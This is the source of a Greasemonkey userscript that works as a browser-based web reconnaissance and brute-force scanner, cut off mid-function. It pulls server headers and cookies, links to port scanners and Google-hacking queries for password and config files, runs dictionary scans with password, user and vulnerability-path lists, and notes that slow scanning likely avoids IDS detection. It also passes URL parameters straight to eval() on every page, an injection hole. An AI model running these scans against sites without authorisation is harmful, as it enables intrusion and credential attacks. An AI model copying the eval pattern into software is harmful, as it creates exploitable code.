// ==UserScript==
// @name           WebPageFingerPrint v0.4
// @namespace      yehg.net
// @sourceurl	   http://userscripts.org/scripts/show/30285
// @description    For web2.0 security analysis. To be used with FireBug. Provides http headers, overall view of the current page contents - javascript, cookies, fuzzable links, form information. For security assessment, it provides recon scan, bruteforce scan, and fuzzing form. What it differs from the thick-client full-fledged scanner is that this script is tied to the current url page and will not mess with the whole web site. Use it at your own risk. Feel free to send bugs.				
// @change_logs    v0.4 fix https bug reported by Robert Carr. Prints inline script to firebug log, replacing alert display in previous versions. v0.3 fixes bugs.[Now] Edittable form fields with submit button. Added Ajax Framework Fingerprinting.Likely to be updated over time. [version 0.2]Integrated with JS-file fingerprinting, fuzzing, bruteforcing [Reasons] Sometimes, clicking each in WebDeveloper Toolbar is tedious.I'd like to read a summerized view of current web page first. Here this script comes in. Edittable form fields with submit button. Added Ajax Framework Fingerprinting.Likely to be updated over time. [version 0.2]Integrated with JS-file fingerprinting, fuzzing, bruteforcing [Reasons] Sometimes, clicking each in WebDeveloper Toolbar is tedious.I'd like to read a summerized view of current web page first. Here this script comes in. 
// @warning	   Use it only for lawful purposes as the script has vulnerability scanning which invokes IDS detection
// @author         Aung Khant (http://yehg.net/lab)
// @privacy_policy No data from you is collected, stored or sold to third-parties. 
// @license	   GPL v2
// @credits	   Great Thanks for bug report, suggestion, encouragement, testing to 
//		     - Robert Carr 
//		     - Mario Heiderich (http://h4k.in), 
//		     - Wordlists taken from  WSfuzzer
//		     - JS Colorizer by Cezary Tomczak, http://code.gosu.pl, 
//		     - Ajax Db List from shreeraj (http://net-square.com)
// @contribute	   Send suggestions, bugs, fixes, help to suggest @ yehg.net
// @include        *
// @exclude        about:*
// @exclude        data:*
// @exclude        file:*
// @exclude        unmht:*
// @exclude        ftp:*
// @exclude 	   ftps:*
// @exclude 	   view-source:*
// ==/UserScript==



var version = "0.4";
var author = "Aung Khant (http://yehg.net/lab)";
var yehg_url = "http://yehg.net";
var yehg_url_scheme = document.location.toString().substr(0,document.location.toString().indexOf("://")+3);
var yehg_url_port = (document.location.toString().substr(document.location.toString().indexOf(document.domain)+document.domain.length,document.location.toString().indexOf("/")).indexOf(":")>-1)?document.location.toString().substr(document.location.toString().indexOf(document.domain)+document.domain.length,document.location.toString().indexOf("/")):':80';
yehg_url_port = (yehg_url_port==':80' && unsafeWindow.location.protocol == 'https:')?':443':yehg_url_port;
var invalidext = /(js|vbs|jpg|jpeg|gif|png|css|txt|conf|java|phps|c)$/;
var jsext = /(js\?fingerprint)$/;
var invalidprotocol = /^file|ftp|ftps|about|view\-source|data|unmht/;
var printdata = "<span style='float:right;cursor:pointer;' title='YEHG.Net Lab' onclick='window.open(\"http://yehg.net/lab\");return false;'><img src='data:;base64,R0lGODlhggAvANUAAAAAAMPDwXt7ezo6OhUVE////7KysGBgX6GhoA0NDOPj4pmZmU9PTjMzM9bW1pmZmbq6uCkpKe/v72ZmZggICEpKSoqKiKqqqPf39x0dHBAQEFpaWt7e3kJCOrW1tczMzISEg3Nzc729va2trRkZGebm5lJSUu/v90JCQmZmZq2ttaWlpSEhIYyMjMXFxQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAHAP8ALAAAAACCAC8AAAb/wJLHQCwaj8ikcslEQkTQqHRKrVqv2CukNAotvuCweEwum8/iFouiabvf8Lh8Tq/PCZeLocDv+/+AgYKDhIANAIiJiouMjY6PkI8JI5SFlpeYhBIRkZ2en5+TlZmkpYWboKmqqaIjpq+wfairtLWMrbG5pbO2vbS4lx8BGH4KIhJ8GB8uzC4lBQrIfSUfxKS8iQQDDdwNAxok290DESQNCYoRGQARLIkU3gPyJIoUEeiICQ0EjcCWCwAW9MGAggSHAiIOKRK4AYW0AmoOXuO0aIO1PihCAHIxgYNCAAQ+tAAgAiCABiL+CFA0oUCIRA0kbOhHyRWmCgAc8LEAAEGB/w8JNAhYgaDoQQYAWu40uIuiogMSQmw4cGACiQgHTGwJcWDABAkfDQJ0AZDFwQVUqzol8QGaOwADCsy8VTOTAxIVCjgAwIDPBqaA5oLYmUFiJmyIDpTQ4MiCA34AoH7U8AFgAICDBzxqGaDASrgY5i7yd6lFAgQTNOgsQEJpCQWwkVXYEIKCzxaFmzI6oMAEGBCQAbS4m1jB1BATBEjgGaAFBRcGHpGQAAGAAQz0BoSmOSrTXIF8NFj4GUFDBg0mCszGwED1itwTd3MYzKfEW+HEIzuw8KzPyuYUOIDAIxqlJhAIoImmCGnBnOQHVgWUgMAXKDRQAAN9lRBBBBs0YP8YJohFpuGGDURAQSLD0ZNUCSiwUCIKCox0mXUBOEKCAgGMx4cC8GxHV3eYYMDCBn6AQMEefVhgIYbEOLBOA/0d5lQiijHWSIqIfPURAQ7ICFBLEzSinAkNHFCBABgIEIEEJnBn02Ea9CULCuyYYCcBS1ZgTQAUZKCAboscgIEHeVwAwUcLKKDiBBiEpQBAHwx4pF41QYACASVUp4gLDlRQAgcrUAJBmAAwaIkEGf0hwQQZsOBqBge4FMJFC6AQJYhTIlLBBxz0ygGLiYRgAGQmBOCUBgashMBnCVjg6692fkCnIih8IMAICvhaAoKl1lUKBhf5gYEE5EpADLi6FBD/YqkJtNvuiYhQAG8+i8gLgL0LussGPqNp4K6++Xib7sCDrOvLwZCYSvDC6uaK8MOOKMzwwAZDbHG3eUysccMXd1yvHhYEYIAHJJds8skop6zyyiyTLIIB5xAg88w012zzzTjnrDPOGRjA0QRABy300EQXbfTRSCet9NJMN100dCTYIfXUVNdBwQAQuBDA1lx37fXXYIct9thfi0TJvB5DPMBDG0+8Qqj8pv3w2m1v/PYIcct9MN11uw233mqz3ffAd+cNuC18D05w4Yg0YMK8FGwwZQImMgJPVUCXs4GVJ03AgldpTdBmA0J3xTkiiQPiwApgtEUWGCtU84cDFyww/4Jhq/+hgE8STAgGBIL3wTgAIHCgIgAZlEAqIi0UcMAiKHxYwAQVzJJXdeD18QEF9PkhkyKp9+HAR4gUyAgBHuyomSImIGOBBn8YkEEBLqDdbSDDF3988ssP8MwHnIsJB5ATtAi0jxMOEQFjDOCAoEklIBwYWgB4Eb4CGI8EIPBdC9rCABaIIQIEUAAGcBIC34UpVi2Anx/kV4AaTYB1C0DAAAIEiPwZLxEkUF4iViCBC6wqEQgIEVSuIoEAWKkkjECAB9DGAh2iLngWmBQgUJAeP4jgOSLoyR8QVBkV9oGFEKBASvrAgQRkT3h/I54DNgA756GuADz5gAPgFalGbP8ggsbgHAQWMIEvXGAmC7hiOn74RECQiQ8O+IAiD1IBPfkhjC5oQQTCpRcAEIUA8ZvfFSHgBw5ooHl/yJ8DBOCrPz2PAiMYYQMu4BJE7KcRJuAAJ5GSiD0mKhoIWgAEDNjIA3yAgsFjQFwccJ81baACDigZAlgQQgFYaHY9QQAmVzg/CCTAAy4YwRA005ZQprF4LCABCfTxQxRAZAXaOxEU7AeADSggAuicFgAggAA2yOxECEhWMWhZyD+EgAV8gA4EBJABmWxAAPOKgAsKsAAu/aFGHkCABtj2ngJAgAUIcMok8PfNGyLiRmHywDsdh4LxnBADIUiAvOy1AQm4IyX/OJnnBZK4S2HOygBoq2AWlcIHD+TwmA6AQADCJABEUgAF4AIXBwaQPKCEwFwYUAA3LHrNDxABeILIXwmO18SuQEQRBODAYyxpwQAo8gMYAsu9PICBNqGzGQLqSf2CxVDwBc8zACABCubRxIZcJEzgAYg25CGv9LmRAHtFBys9AADDFmJ4bOQcAWo1AQQcT1cB0AwFJmAAEUBAqBVoAALWUaoYbtYFn80aQA7wmWB54CMV5MMFGICC2qKAUS0AwUVWZYL+BGADA6itLweCANretjM/2cBqHpvGR7AzXs91bnQdgS+43PVblGzb8A7ni9gqDhbb5S7irvtdU4RXvLTwS255S3Fe9KpCvevNxAhWcAEC/Ou++M2vfvfL3/7aowULaIGAB0zgAhv4wAhOsIINzMcRZCq1EI6whCdM4Qpb2MJNyLCGN7xhD5QgCAA7'></span><h3 style='color:yellow!important;'><span style='text-align:center'>YEHG.Net Greasemonkey Web Page Fingerprinter</span> &nbsp;&nbsp;<span target='_blank' style='color:yellow!important;text-decoration:none;cursor:pointer;'   onclick='hideYehgFingerprint()'>[x]</span></h3><br>";

if((!jsext.test(document.URL)) && (!invalidprotocol.test(yehg_url_scheme)) && (!document.title.search(/(Problem loading page|Page load error)/i)==0) ) 
{
		
unsafeWindow.yehgdoFingerpint = function()
{
    
if( (!jsext.test(document.URL))&&(!invalidext.test(document.URL)) && (!invalidprotocol.test(document.URL)) && (!document.title.search(/(Problem loading page|Page load error)/i)==0) ) 
{

unsafeWindow.yehgupx = 0;

unsafeWindow.yehgshowFingerprint = function()
{
    
    if(unsafeWindow.document.getElementById("yehgfingerprint"))
    {
        unsafeWindow.document.getElementById("yehgfingerprint").style.display = '';
        unsafeWindow.document.getElementById("yehgfingerprint").style.opacity = "0." + unsafeWindow.yehgupx;
        unsafeWindow.yehgupx++;
        if(unsafeWindow.yehgupx==9)
        {
            unsafeWindow.yehgupx=0;clearTimeout(unsafeWindow.yehgsfg);
        }        
    }

}

// if Firebug is installed, log in its console, too for JS Objs and Functions
// otherwise, call alert()
unsafeWindow.yehgWriteFirebugConsoleLog = function(str)
{
    if(unsafeWindow.console)
    {
        unsafeWindow.console.log(str);
    }
    else
    {
	alert(str);
    }
}
unsafeWindow.yehgWriteFirebugConsoleDir = function(str)
{
    if(unsafeWindow.console)
    {
        unsafeWindow.console.log('"'+str+'"');
        unsafeWindow.console.dir(str);
    }
}

printdata += "<br><b>[URL]</b><br><br>";
printdata += document.location+"<br>";



// Display Header
// @note GM xml httprequest doesn't provide me all XHR functions; afraid of security, nice!

var headers = "";               
var xhr = new XMLHttpRequest();
xhr.open("HEAD",yehg_url_scheme +document.domain.toString()+yehg_url_port,false);
xhr.send(null);

printdata += "<br><b>[Headers]</b><br><br>";
headers= xhr.getAllResponseHeaders();

var full_header = headers;
var feachh = new Array();
var feachstr = "";
for(i=0;full_header.length>i;i++)
{
   if(full_header[i]=="\n")
   {           
        feachh.push(feachstr);
        feachstr="";                
   }
   else
   {
       feachstr += full_header[i];        
   }

}
var shstr = ""; // Header Servers:
var spstr = ""; // Server X-Powered-By:
var othersh = "";
for(var f=0;f<=feachh.length-1;f++)
{
    if(feachh[f].indexOf("Server:")!=-1)
    {
        shstr = feachh[f];                
    }
    else if(feachh[f].indexOf("X-Powered-By")!=-1)
    {
        spstr = feachh[f];        
    }
    else
    {
        othersh += feachh[f] + "\n";    
    }
}

// Header Server:
var plain_header_server = xhr.getResponseHeader("SERVER");
var headerstr = shstr;
var whitespaces=0;
var eachh = new Array();
var eachstr = "";
//alert(full_header);
for(i=0;i<=headerstr.length;i++)
{
   if(headerstr[i]==" " || i==(headerstr.length))
   {
        eachh.push(eachstr);
        eachstr="";
        whitespaces++;
   }
   else
   {
       eachstr += headerstr[i];               
   }

}

header_server = "";
if(whitespaces>1)
{
    for(var e=0;e<=eachh.length-1;e++)
    {
        var hh = eachh[e] + "";
        if(hh.indexOf("Server:")==-1 && hh.indexOf("(")==-1)
        {
        header_server += "<a style='color:yellow!important;text-decoration:underline;' title='Find its vulnerabilities in Google' target='_blank' href='http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=" + eachh[e] + " vulnerabilities'>" + eachh[e] +"</a> ";
        }
        headers = "Server: "+header_server+"<br>";
    }            
}
else
{
     headers = shstr + "<br>";
}

// Header: X-Powered-By

headerstr = spstr;
whitespaces=0;
var eachh = new Array();
var eachstr = "";
for(i=0;i<=headerstr.length;i++)
{
   if(headerstr[i]==" " || i==headerstr.length )
   {
        eachh.push(eachstr);        
        eachstr="";
        whitespaces++;
   }
   else
   {
       eachstr += headerstr[i];               
   }

}

header_server = "";
if(whitespaces>1)
{
    for(var e=0;e<=eachh.length-1;e++)
    {
        var hh = eachh[e] + "";        
        if(hh.indexOf("X-Powered-By:")==-1)
        {
        header_server += "<a style='color:yellow!important;text-decoration:underline;' title='Find its vulnerabilities in Google' target='_blank' href='http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=" + eachh[e] + " vulnerabilities'>" + eachh[e] +"</a> ";
        }
        
    }
    headers += "X-Powered-By: "+header_server+"<br>";
}
else
{
     headers += spstr + "<br>";
}

// End Server: X-Powered-By

var win = /(win|win32|windows|microsoft)/i;
var iis4 = /(iis\/4)/i;
var iis5 = /(iis\/5)/i;
var iis6 = /(iis\/6)/i;
var iis7 = /(iis\/7)/i;
var lin = /(linux|unix|redhat|red hat|darwin|fedora|ubuntu|openbsd|mandrake|mandriva|debian|novell|slackware|centos|freebsd|suse|solaris|sun|sunone)+/i;        
if(win.test(plain_header_server))
{
    headers += "OS: " + "Windows";            
}
if(iis4.test(plain_header_server))headers += " 2000";
if(iis5.test(plain_header_server))headers += " 2000 SP.x, XP";
if(iis6.test(plain_header_server))headers += " 2003";
if(iis7.test(plain_header_server))headers += " 2007";
if(lin.test(plain_header_server))
{
    headers += "OS: " + "Unix/Linux";            
}
var OS = plain_header_server.match(/(\()[\d\S]+(\))+/gi);
if (OS){headers += "&nbsp;"+OS[0];}
headers += "<pre style='font-family:arial;font-size:normal'>" + othersh + "</pre>";
printdata += headers;        

unsafeWindow.yehgescapeHTML=function(value)
{
	value = value.replace(/</g,"&lt;");	
	value = value.replace(/>/g,"&gt;");
	value = value.replace(/'/g,"&#39;");
	value = value.replace(/"/g,'&quot;');
	value = value.replace(/\\/g,"\\\\");	

    return value;
}

//xhr.open("GET",document.URL,true);
//xhr.send(null);
currentdocument_content = document.body.innerHTML; //xhr.responseText;
currentdocument_content_length = document.body.innerHTML.length; // xhr.responseText.length;
unsafeWindow.yehgcurdoc_contentlength  = currentdocument_content_length ;

printdata += "Content-length: <span style=\"font-weight:bold;color:#AAFFAA\">" + currentdocument_content_length + "</span><br>";

unsafeWindow.yehg$_GET = function(param)
{
	var url  = document.URL;
	var value = false;
	if(url.indexOf("?")>-1 && url.indexOf("=")>-1)
	{
		if(url.indexOf("&")!=-1)
		{
			if(url.indexOf(param)>-1)
			{
				//value= url.substring(url.indexOf(param)+param.length+1,url.lastIndexOf("&"));
				value= url.slice(url.indexOf(param)+param.length+1,url.length);
				//alert('initial param: '+ param + '\nvalue:'+value);
				if(param!="yehg_grep")
				{
					value = value.slice(0,value.indexOf("&"));
				}
				else
				{
					value = value.slice(0,value.length);	
				}
				
				//alert('param: '+ param + '\nvalue:'+value);
				/*if(value.search(/[0-9]/g)==-1 && value.search(/null/g)==-1)	
				{			
					value= url.substr(url.indexOf(param)+param.length+1,url.lastIndexOf("&"));					
				}*/
										
			
			}
		}		
	}
	
	return value;
	
} 


if(unsafeWindow.yehg$_GET("yehg_content_length")!=false && unsafeWindow.yehg$_GET("yehg_content_length")!="undefined" && unsafeWindow.yehg$_GET("yehg_content_length")!="null")
{	
	//alert('content length -> '+ unsafeWindow.yehg$_GET("yehg_content_length"));
	var oper = unsafeWindow.yehg$_GET("yehg_operator");
	var cl = unsafeWindow.yehg$_GET("yehg_content_length");

	if(eval(cl + oper + currentdocument_content_length))
	{			
		unsafeWindow.close();
	}

}

if(unsafeWindow.yehg$_GET("yehg_content_grep_criteria")!=false && unsafeWindow.yehg$_GET("yehg_content_grep_criteria")!="undefined" && unsafeWindow.yehg$_GET("yehg_content_grep_criteria")!="null" && unsafeWindow.yehg$_GET("yehg_grep")!=false && unsafeWindow.yehg$_GET("yehg_grep")!="undefined" && unsafeWindow.yehg$_GET("yehg_grep")!="null")
{	
	var crite = unsafeWindow.yehg$_GET("yehg_content_grep_criteria");
	var cont = decodeURIComponent(unsafeWindow.yehg$_GET("yehg_grep"));
	
	var re = new RegExp(cont,"gi");
	
	if(crite == "AND")
	{			
		if(re.exec(currentdocument_content)!=null)
		{
			unsafeWindow.close();
		}
	}
	else if(crite == "NOT")
	{
		if(re.exec(currentdocument_content)==null)
		{
			unsafeWindow.close();
		}		
	}


}

if(document.cookie.length>0)
{
    printdata += "Cookie: " + unsafeWindow.yehgescapeHTML(document.cookie) + '<br>&nbsp;&nbsp;=> <span style="cursor:pointer;color:yellow!important;" title="Edit cookies" onclick="document.cookie=prompt(\'Edit cookie:\\n\',\'' +unsafeWindow.yehgescapeHTML(document.cookie)+'\');">Edit Cookie</span><br>';    
}

for(var i=0;i<=document.getElementsByTagName("meta").length-1;i++)
{
    var item = document.getElementsByTagName("meta")[i];

    if(item.name.match(/generator/i))
    {
        if(item.content!="")printdata += "Generated by: <a style='color:yellow!important;text-decoration:underline;' title='Find its vulnerabilities in Google' target='_blank' href='http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=" + item.content + " vulnerabilities'>"+item.content+"</a><br>";            
    }
    
    if(item.name.match(/robots/i))
    {
        if(item.content!="")printdata += "Robot:  " + item.content + "<br>";            
    }
    
    if(item.name.match(/description/i))
    {
        if(item.content!="")printdata += "Description:  " + item.content + "<br>";            
    }
    
    if(item.name.match(/author/i))
    {
        if(item.content!="")printdata += "Author:  <a style='color:yellow!important;text-decoration:underline;' title='Find it in Google' target='_blank' href='http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=" + item.content + "'>"+item.content+"</a><br>";            
    }
    
    if(item.name.match(/ProgId/i))
    {
        if(item.content!="")printdata += "<br>ProgId:  <a style='color:yellow!important;text-decoration:underline;' title='Find it in Google' target='_blank'  href='http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=" + item.content + "'>"+item.content+"</a><br>";            
    }
}

bodystr = document.body.innerHTML;

if(bodystr.indexOf("Powered by")!=-1)
{
    bodystr = bodystr.substring(bodystr.indexOf("Powered by")+10,bodystr.indexOf("Powered by")+100 );
    pow="";
    for(i=0;bodystr.length>i;i++)
    {
        if(bodystr[i]=="<")break;
        if(i<(bodystr.length-1))
        {
            pow += bodystr[i];
        }
    }

    printdata += "Powered by: <a style='color:yellow!important;text-decoration:underline;' title='Find it in Google' target='_blank' href='http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=" + pow + "'>"+pow+"</a><br>";
}

bodystr = document.body.innerHTML;

if(bodystr.indexOf("Hosted by")!=-1)
{
    bodystr = bodystr.substring(bodystr.indexOf("Hosted by")+10,bodystr.indexOf("Hosted by")+100 );
    hos="";
    for(i=0;bodystr.length>i;i++)
    {
        if(bodystr[i]=="<")break;
        if(i<(bodystr.length-1))
        {
            hos+= bodystr[i];
        }
    }

    printdata += "Hosted by: <a style='color:yellow!important;text-decoration:underline;' title='Find it in Google' target='_blank' href='http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=" + hos + "'>"+hos+"</a><br>";
}

// Display Lookups,Whois,MX

unsafeWindow.yehgLaunchAllRecons = function()
{
	var c=confirm('Are you sure to launch all RECON links?\n\nIt\'ll launch each link in every 10 seconds till complete.\nOpening multiple windows hang your browser!\nBe sure to allow popups!\n\nHappy passive RECON!\n');
	var timeout=0;
	if(c)
	{
		for(var x=0;x<=document.getElementById('yehg_RECON_select').length-1;x++)
		{
			if(document.getElementById('yehg_RECON_select')[x].value!='')
			{
				
				setTimeout("window.open(document.getElementById('yehg_RECON_select')[" + x +"].value+document.domain)",timeout);	timeout += 7000;
			}
		}
	}
}
unsafeWindow.yehgPrependProxy = function()
{
	var proxy_url=prompt('Enter cgi/php proxy url to prepend RECON links.\n\nSome sites suck our IP addresses for repeated uses.\n\nCheck out cgiproxy.us.\nType cgiproxy for going to that URL.','https://');if(proxy_url!=null && proxy_url!='' && proxy_url!='https://'){if(proxy_url='cgiproxy'){window.open('http://cgiproxy.us');}else{for(var x=0;x<=document.getElementById('yehg_RECON_select').length-1;x++){if(document.getElementById('yehg_RECON_select')[x].value!=''){document.getElementById('yehg_RECON_select')[x].value=proxy_url+document.getElementById('yehg_RECON_select')[x].value;}}alert('From now on, the query will be like:\n'+proxy_url+'http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:log');}}
}
printdata += "<br><b>[WebPage FingerPrinter Options]</b><br><br>";
printdata += 'Time between each request : <input type="text" value="3000" id="yehgBruteTimeOut"/><br>';
printdata += "<br><b>[RECON]</b><br><br>";

printdata += '<select id="yehg_RECON_select" onchange="if(this.selectedIndex!=0){if(this.value==  \'http://www.robtex.com/dns/\'){window.open(this.value+document.domain+\'.html\');}else{window.open(this.value+document.domain);}}"><option value="">---Lookup---</option><optgroup label="Whois"><option value="http://whois.webhosting.info/">Webhostinfo</option><option value="http://private.dnsstuff.com/tools/dnsreport.ch?domain=">DNSStuff</option><option value="http://www.robtex.com/dns/">RobtexDNS</option><option value="http://network-tools.com/default.asp?prog=dnsrec&host=">Network DNSRecords</option><option value="http://whois.domaintools.com/">DomainTools</option><option value="http://samspade.org/whois/">SamSpade</option><option value="http://www.hcidata.info/host2ip.cgi?findIP=+Find+IP+Address+&domainname=">Host2IP</option><option value="http://uptime.netcraft.com/up/graph/?host=">Netcraft WhatSite</option><option value="http://toolbar.netcraft.com/site_report?url=">Netcraft SiteReport</option><option value="http://network-tools.com/default.asp?prog=trace&host=" title="Note: Scroll down the page for viewing results of Network Trace after page loading">Network Tracert</option><option value="http://network-tools.com/default.asp?prog=network&host=">Network Lookup</option><option value="http://network-tools.com/default.asp?prog=whois&host=">Network Whois</option><option value="http://www.betterwhois.com/bwhois.cgi?domain=">Betterwhois</option><option value="http://network-tools.com/default.asp?prog=express&host=">Network Express</option><option value="http://google-analytics.freehostia.com/lab//portscan.php?host=">PortScan1</option><option value="http://google-analytics.freehostia.com/lab/port_scanner.php?host=">PortScan2</option><option value="http://www.flashwebservices.co.uk/apps/flashport/">FlashPortScan</option></optgroup><optgroup label="Mail MX"><option value="http://www.trimmail.com/news/tools/mailserverprofiler?lookup_type=mxanalyzer&dig_type=none&lookup_target=">MX Profile</option><option value="http://www.hashemian.com/tools/domain-email.php?b=">MX Lookup</option><option value="http://www.emailstuff.org/dns/mx/">MX Records</option></optgroup><optgroup label="GoogleHacking"><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=intitle:%22Index%20of%22%20 site:">dirIndexing</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=cache:">cache:</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=link:">link:</option><option value="http://www.google.com/search?hl=en&?q=site:">site:</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=@">email</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:pdf site:">file:pdf</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:xls site:">file:xls</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:xml site:">file:xml</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:doc site:">file:doc</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:ppt site:">file:ppt</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:txt site:">file:txt</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:rtf site:">file:rtf</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:conf site:">file:conf</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:config site:">file:config</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:ini site:">file:ini</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:lst site:">file:lst</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:zip site:">file:zip</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:gzip site:">file:gzip</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:eml site:">file:eml</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:ps site:">file:ps</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:exe site:">file:exe</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:rpm site:">file:rpm</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:db site:">file:db</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:mdb site:">file:mdb</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:log site:">file:log</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:passwd site:">file:passwd</option><option value="http://www.scroogle.org/cgi-bin/nbbw.cgi?Gw=filetype:pwd site:">file:pwd</option></optgroup></select>&nbsp;&nbsp;';
printdata += '[<span style="cursor:pointer;color:yellow!important;text-decoration:underline;" onclick="yehgLaunchAllRecons();">Launch all</span>]&nbsp;&nbsp;&nbsp;[<span style="cursor:pointer;color:yellow!important;text-decoration:underline;" onclick="yehgPrependProxy()">Prepend Proxy</span>]<br><br>';

printdata += "<br><b>[BruteForce Scan]</b><br><br>";

printdata += '<select id="yehg_brute_force_select"><option selected="selected">-- Select ---</option><optgroup label="Dictionary"><option value="dic1.txt">Dic-Small</option><option value="big2.txt">Dic-Comprehensive</option><option value="big.txt">Big</option><option value="catala.txt">Catala</option><option value="common.txt">Common</option><option value="euskera.txt">Euskera</option><option value="medium.txt">Medium</option><option value="passlist.txt">Passlist</option><option value="spanish.txt">Spanish</option><option value="subdomains.txt">Subdomains</option><option value="userlist.txt">Userlist</option><option value="weak_passwords_module_passlist.txt">Weak_passwords_module_passlist</option><option value="weak_passwords_module_userlist.txt">Weak_passwords_module_userlist</option><option value="common_pass.txt">Common_pass</option><option value="names.txt">Names</option><option value="upload_dirs.txt">Common Upload Dirs</option></optgroup><optgroup label="Vulnerability"><option value="vulns/apache.txt">Apache</option><option value="vulns/cgi.txt">Cgi</option><option value="vulns/cgis.txt">Cgis</option><option value="vulns/coldfusion.txt">Coldfusion</option><option value="vulns/domino.txt">Domino</option><option value="vulns/fatwire.txt">Fatwire</option><option value="vulns/fatwire_pagenames.txt">Fatwire_pagenames</option><option value="vulns/frontpage.txt">Frontpage</option><option value="vulns/iis.txt">Iis</option><option value="vulns/iplanet.txt">Iplanet</option><option value="vulns/jrun.txt">Jrun</option><option value="vulns/netware.txt">Netware</option><option value="vulns/oracle9i.txt">Oracle9i</option><option value="vulns/sharepoint.txt">Sharepoint</option><option value="vulns/sunas.txt">Sunas</option><option value="vulns/tests.txt">Tests</option><option value="vulns/tomcat.txt">Tomcat</option><option value="vulns/vignette.txt">Vignette</option><option value="vulns/weblogic.txt">Weblogic</option><option value="vulns/websphere.txt">Websphere</option></optgroup><optgroup label="OSVDB"><option value="vulns/osvdb-iis.csv">o-iis</option><option value="vulns/osvdb-cfm.csv">o-cfm</option><option value="vulns/osvdb-jsp.csv">o-jsp</option></optgroup></select>';

printdata += "&nbsp;&nbsp;[<span style='color: yellow ! important;cursor:pointer;' title='Choose file and start scanning!' onclick='yehgLoadBruteForceStart();return false;'>Start</span>]&nbsp;&nbsp;[<span style='color: yellow ! important;cursor:pointer;' title='Choose file and start scanning!' onclick='yehgViewBruteForceFile();'>View</span>]<br/>";
printdata += '<div id="brute_force_loading_img" style="display:none"><br>Loading ...<br><br>Do other stuffs. <br> Seem slowly? As it doesn\'t do multi-requests, <br>it\'s likely that web server IDS may not detect scanning.<br>But it\'s for dictionary scanning only. <br></div><div id="brute_force_result"></div>';
unsafeWindow.yehgbruteforcestr = new Array();
unsafeWindow.yehgbruteforcecurrent_file = "";
unsafeWindow.yehgIsDuplicate = function(v,ar)
{
		var duplicate = false;
		for(var i=0;i <= ar.length-1;i++)
		{
			if (ar[i] == v){duplicate = true;}
		}
		return duplicate;
}

unsafeWindow.yehgcurrentjob = "";

unsafeWindow.yehgBackupFiles = new Array();
unsafeWindow.yehgBackupFileSearch = function()
{
	// Common Backup Styles: 
	//				  1) index.bak
	//				  2) index.php.bak
	//				  3) index.php-bak
	//				  4) index.php_bak	
	

	unsafeWindow.scrollTo(0,500);
	
	var l = document.getElementsByTagName("a");
	var lnks = new Array();	
	var bklinks = new Array();
	
	var backupexts = ["_","__","001","002","1","2","back","backup","bk","bak","bakup","bas","bz2","c","conf","copia","core","cpp","dat","db","default","dll","doc","inc","ini","java","old","orig","pas","sav","saved","sql","source","src","temp","test"];
	
	var backupzexts = ["~",".old",".7z",".Z",".jar",".rar",".stackdump",".tar",".tar.gz",".tmp",".tgz",".war",".zip",".txt",".1",".2",".3",".dev",".copy",".orig"];
	
	var thisURI = yehg_url_scheme+document.domain+"/";
	// [Current File Scan]
	// Check the file has been scanned
	if(unsafeWindow.yehgIsDuplicate(thisURI,unsafeWindow.yehgBackupFiles)==true){alert("This URL is being scanning or has been scanned.");return;}
	unsafeWindow.yehgBackupFiles.push(thisURI);
	unsafeWindow.yehgcurrentjob = "Backupfile Scaning: " + thisURI; 
	
	var cur_file_url = document.getElementById('fuzz_url').value;//document.URL.toString();
	cur_file_url = cur_file_url.replace(/(\?\=)/g,""); 
	var cur_file_uricomponent = cur_file_url.replace(thisURI,"");	 
	var cur_file_to_fuzz = thisURI + cur_file_uricomponent.substr(0,cur_file_uricomponent.indexOf("."));
	unsafeWindow.yehgbruteforcecurrent_file = cur_file_to_fuzz;
		

	if(cur_file_url.lastIndexOf("?")!=-1)
	{
		cur_file_ext = cur_file_uricomponent.substring(cur_file_uricomponent.indexOf("."),cur_file_uricomponent.indexOf("?"));
		 
			
	}
	else
	{
		cur_file_ext = cur_file_uricomponent.substring(cur_file_uricomponent.indexOf("."),cur_file_uricomponent.length);
	}	
	cur_filenameonly = cur_file_uricomponent.substr(0,cur_file_uricomponent.indexOf("."));
	cur_filedir =  cur_file_to_fuzz.substr(0,cur_file_to_fuzz.lastIndexOf("/")+1); 
